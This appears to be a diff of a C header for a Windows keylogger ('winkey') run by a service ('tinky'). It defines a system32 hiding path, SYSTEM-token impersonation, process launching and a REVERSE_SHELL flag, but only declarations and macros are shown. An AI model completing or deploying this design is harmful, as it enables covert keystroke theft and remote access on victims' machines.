@@ -10,7 +10,7 @@
 //#include "unicode.h"
 
 // =============== Magic variables ========== //
-#define WINKEY_STOP TEXT("Global\\stop_winkey_process")  // NameSpace Global ?
+#define PROCESSES_STOP TEXT("Global\\stop_tinky_processes")  // NameSpace Global ?
 #define SVC_NAME TEXT("svc")
 #define KYLG_NAME TEXT("winkey")
 #define HIDING_PATH TEXT("C:\\Windows\\system32\\winkey.exe")
@@ -27,6 +27,15 @@
 // ============================================= //
 
 // =============== Structs =============== //
+typedef struct processes {
+	HANDLE					stopEventHandle;
+	HANDLE					systemToken;
+
+	STARTUPINFOW			winkeyStartupInfo;
+	PROCESS_INFORMATION		winkeyProcessInfo;
+
+}	processes_t;
+
 typedef struct tinky {
 	// install {
 	SC_HANDLE	scmHandler;
@@ -36,24 +45,23 @@ typedef struct tinky {
 	// Global {
 	char	*winkeyExePath;
 	char	*tinkyExePath;
-	HANDLE	systemToken;
 	// }
 
 	// start {
 	SERVICE_STATUS			svcStatus;
 	SERVICE_STATUS_HANDLE	svcStatusHandle;
 	HANDLE					tinkyStopEventHandle;
-	HANDLE					winkeyStopEventHandle;
-	STARTUPINFOW			startupInfo;
-	PROCESS_INFORMATION		processInfo;
 	// }
 }	tinky_t;
 // ============================================= //
 
+// process.cpp //
+#define REVERSE_SHELL 1
+BYTE launchProcess(DWORD dwNumServicesArgs, LPWSTR *lpServiceArgVectors);
+// =============== serviceControlManaged =============== //
+int startedBySCM(void);
 // =============== cmdLineControlManaged.cpp =============== //
 BYTE initControl(void);
-// =============== service control managed =============== //
-int startedBySCM(void);
 // =============== impersonate.cpp =============== //
 void impersonate(void);
 // =============== install.cpp =============== //
